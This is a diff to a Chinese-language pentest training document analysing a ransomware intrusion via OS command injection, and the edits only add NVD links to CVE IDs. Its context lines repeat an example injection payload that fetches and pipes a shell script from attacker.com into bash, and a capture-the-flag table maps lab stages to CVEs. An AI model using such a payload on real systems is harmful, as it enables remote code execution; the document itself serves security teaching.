@@ -14,7 +14,7 @@
 
 ## 二、攻擊手法分析
 
-### 初始入侵：指令注入（CVE-2026-39808）
+### 初始入侵：指令注入（[CVE-2026-39808](https://nvd.nist.gov/vuln/detail/CVE-2026-39808)）
 
 攻擊者透過物流查詢系統的 HTTP 請求參數，注入未經驗證的作業系統指令。  
 此漏洞屬於 **OS Command Injection**，CVSS 分數 9.8（Critical），無需帳號即可觸發，允許攻擊者在伺服器上執行任意指令。
@@ -29,7 +29,7 @@ GET /track?id=1234;curl http://attacker.com/shell.sh|bash
 取得初始 RCE 後，攻擊者橫向擴散至雲端主機，導致主要系統全數無法存取。  
 此階段企業通常需要緊急切斷所有內外網連線，造成服務全面中斷。
 
-### 持久化：勒索軟體部署（CVE-2026-33825）
+### 持久化：勒索軟體部署（[CVE-2026-33825](https://nvd.nist.gov/vuln/detail/CVE-2026-33825)）
 
 攻擊者最終部署 **Payouts King** 勒索軟體，以偽裝於虛擬機中運行的方式規避偵測，對企業資料進行加密，同時威脅若未支付贖金即公開資料。
 
@@ -65,8 +65,8 @@ GET /track?id=1234;curl http://attacker.com/shell.sh|bash
 
 | CVE | 類型 | CVSS | 說明 |
 |-----|------|------|------|
-| CVE-2026-39808 | OS Command Injection | 9.8 | HTTP 請求參數未過濾，直接拼接進 shell |
-| CVE-2026-33825 | 勒索軟體 / VM 逃逸 | 8.1 | 惡意程式偽裝於 VM 中執行，規避端點偵測 |
+| [CVE-2026-39808](https://nvd.nist.gov/vuln/detail/CVE-2026-39808) | OS Command Injection | 9.8 | HTTP 請求參數未過濾，直接拼接進 shell |
+| [CVE-2026-33825](https://nvd.nist.gov/vuln/detail/CVE-2026-33825) | 勒索軟體 / VM 逃逸 | 8.1 | 惡意程式偽裝於 VM 中執行，規避端點偵測 |
 
 ---
 
@@ -76,10 +76,10 @@ GET /track?id=1234;curl http://attacker.com/shell.sh|bash
 
 | 關卡 | CVE | 攻擊類型 |
 |------|-----|----------|
-| Flag 1 | CVE-2026-39808 | Command Injection |
-| Flag 2 | CVE-2021-41773 | Path Traversal |
-| Flag 3 | CVE-2022-22963 | SSTI |
-| Flag 4 | CVE-2021-26855 | SSRF |
+| Flag 1 | [CVE-2026-39808](https://nvd.nist.gov/vuln/detail/CVE-2026-39808) | Command Injection |
+| Flag 2 | [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773) | Path Traversal |
+| Flag 3 | [CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963) | SSTI |
+| Flag 4 | [CVE-2021-26855](https://nvd.nist.gov/vuln/detail/CVE-2021-26855) | SSRF |
 
 詳細實作流程請見 [`Lab-Pen-Test.md`](Lab-Pen-Test.md)。  
 報告繳交範本請見 [`pentest-report-template.md`](pentest-report-template.md)。
